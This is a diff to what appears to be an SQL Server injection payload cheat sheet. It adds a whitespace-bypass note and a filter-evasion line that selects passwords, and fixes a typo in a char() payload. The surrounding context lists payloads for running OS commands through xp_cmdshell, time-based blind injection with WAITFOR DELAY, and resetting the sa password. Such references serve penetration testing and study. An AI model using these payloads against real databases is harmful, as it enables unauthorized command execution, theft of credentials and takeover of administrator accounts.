@@ -6,6 +6,8 @@ SQL Server Payload
 - Comment 
     - ``SELECT 1 -- comment``
     - ``SELECT /*comment*/1``
+- Space
+    - ``0x01 - 0x20``
 - Current User
     - ``SELECT user_name()``
     - ``SELECT system_user``
@@ -20,10 +22,12 @@ SQL Server Payload
 - Command
     - ``EXEC xp_cmdshell 'net user'``
 - Ascii
-    - ``SELECT char(0×41)``
+    - ``SELECT char(0x41)``
     - ``SELECT ascii('A')``
     - ``SELECT char(65)+char(66)`` => return ``AB``
 - Delay
     - ``WAITFOR DELAY '0:0:3'`` pause for 3 seconds
 - Change Password
     - ``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``
+- Trick
+    - ``id=1 union:select password from:user``
